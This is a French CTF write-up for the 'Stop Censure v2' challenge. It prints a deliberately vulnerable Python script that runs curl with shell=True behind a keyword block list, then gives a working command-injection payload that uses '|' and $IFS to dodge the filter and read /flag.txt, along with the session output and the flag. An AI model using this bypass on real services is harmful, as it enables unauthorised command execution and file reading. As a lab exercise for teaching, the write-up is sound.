---

layout: post  
title: Stop Censure v2  
subtitle: Write-Up pour le NBCTF  
tags: [writeup, injection, command, CTF, Moyen]  
comments: true

---

Salut à tous ! Dans ce write-up, je vais vous présenter comment j'ai résolu le challenge **Stop Censure v2** du NoBracket CTF. Ce défi est une suite du précédent challenge **Stop Censure**, mais avec quelques ajustements apportés par les administrateurs pour corriger la faille initiale.

## Premier coup d'œil

Le contexte de ce challenge est simple : les administrateurs ont découvert la faille que nous avions utilisée dans **Stop Censure**, et ils l'ont corrigée en ajoutant une liste de mots bannis. Notre mission est de trouver un moyen de contourner cette nouvelle restriction et d'accéder au flag.

Le flag se trouve dans le fichier `/flag.txt`. Nous devons, comme dans la version précédente, soumettre une URL pour vérifier si le site est censuré ou non. Si nous parvenons à contourner les restrictions, nous pourrons lire le contenu de `/flag.txt` pour obtenir le flag.

## Analyse du fichier `censure_v2.py`

En comparant le fichier fourni avec le précédent script **Stop Censure**, plusieurs modifications ont été faites pour renforcer la sécurité. Voici le code de la version 2 :

```python
#!/usr/bin/env python3
import subprocess
import re

# Liste des mots et caractères interdits
forbidden = ["cat", "flag.txt", "&", ";", " "]

# Regex qui détermine les sites légaux
pattern = r'https?://[a-zA-Z0-9.-]+\.nobrackets\.fr(/[a-zA-Z0-9./?%_-]*)?'

# Fonction qui teste si un mot interdit est présent dans l'url
def is_forbidden(url):
    for word in forbidden:
        if word in url:
            return True
    return False

# Fonction de vérification de la légalité d'une url
def is_legal_url(url):
    return re.match(pattern, url) is not None

# Bannière
print("---------------------------------")
print("~~ Ce site est-il légal ? (v2) ~~")
print("---------------------------------")

# Entrée utilisateur
value = input("Entrez un site (eg: https://wiki.nobrackets.fr/) >>> ")

# Vérification que l'entrée utilisateur ne soit pas vide
if not value:
    print("Erreur. Veuillez entrer une URL.")
    exit(-1)

# Vérification si un petit malin essaye de nous attaquer
if is_forbidden(value):
    print("Attaque détectée !")
    exit(-1)

# Vérification de la légalité de l'URL entrée
if not is_legal_url(value):
    print("Erreur. Votre URL est soit mal formatée soit illégale !")
    exit(-1)

# Test de l'existence du site
process = subprocess.run("curl -I "+value, capture_output=True, shell=True)
res = process.stdout
if not res:
    print("Erreur. Le site ne semble pas exister.")
    exit(-1)

# Affichage de l'échange
print("Succès ! Le site est légal et fonctionnel ! Voici ses informations : \n\n")
print(res.decode())
exit(0)
```

### Changements apportés :

1. **Liste des mots interdits** : Le script contient désormais une liste de mots interdits qui inclut `"cat"`, `"flag.txt"`, `"&"`, `";"`, et même un simple espace `" "`. Cela empêche l'utilisation directe de certaines commandes shell qui auraient pu nous permettre de lire le fichier contenant le flag dans la première version.

2. **Vérification stricte** : Si l'URL contient l'un de ces mots interdits, le script affiche un message d'attaque détectée et interrompt l'exécution. Cela complique l'injection de commandes directes comme nous avions pu le faire auparavant.

## Étape 1 : Recherche d'un contournement

Face à ces nouvelles restrictions, j'ai commencé à tester différentes méthodes d'injection de commandes. Sachant que certains caractères comme `&` et `;` étaient bannis, j'ai cherché des séparateurs alternatifs pour exécuter des commandes.

J'ai testé différents caractères séparateurs comme `,` ou `|`. À ce stade, j'ai aussi essayé d'envoyer des commandes comme `echo`, et j'ai remarqué que le séparateur `|` fonctionnait. Cela m'a donné une première piste.

## Étape 2 : Test avec `grep` et `$IFS`

Après avoir validé que le séparateur `|` fonctionnait, j'ai essayé de lancer des commandes plus complexes, en particulier en utilisant `grep`. Cependant, avec l'interdiction de l'espace `" "`, il fallait trouver une autre façon de séparer les arguments des commandes.

C'est là que j'ai utilisé la variable spéciale **`$IFS`** (Internal Field Separator) qui permet de remplacer l'espace. En combinant cela avec `grep`, j'ai réussi à contourner la restriction sur les espaces et à accéder au fichier **`/flag.txt`**. 

Voici la commande finale que j'ai utilisée :

```bash
http://node2.nobrackets.fr/,|grep$IFS''$IFS/fl*
```

## Étape 3 : Résultat et récupération du flag

Cette commande m'a renvoyé le flag ! Voici l'output :

```bash
┌─[lxst@parrot]─[~]
└──╼ $nc node1.nobrackets.fr 21458
---------------------------------
~~ Ce site est-il légal ? (v2) ~~
---------------------------------
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> http://node2.nobrackets.fr/,|grep$IFS''$IFS/fl*
Succès ! Le site est légal et fonctionnel ! Voici ses informations : 


NBCTF{IFS_F0r_th3_W1n!}
```

Le flag était bien caché, mais j'ai réussi à contourner les nouvelles restrictions mises en place !

## Conclusion

Dans ce challenge, la simple liste de mots interdits n'était pas suffisante pour empêcher complètement l'injection de commandes. En utilisant des caractères spéciaux comme le séparateur **`|`** et la variable **`$IFS`**, j'ai pu contourner les restrictions et lire le contenu du fichier `/flag.txt`. 

Merci à **Drahoxx** et **ribt** pour ce challenge amusant et instructif ! J'ai apprécié la réflexion nécessaire pour contourner les protections supplémentaires.

Flag : **NBCTF{IFS_F0r_th3_W1n!}**
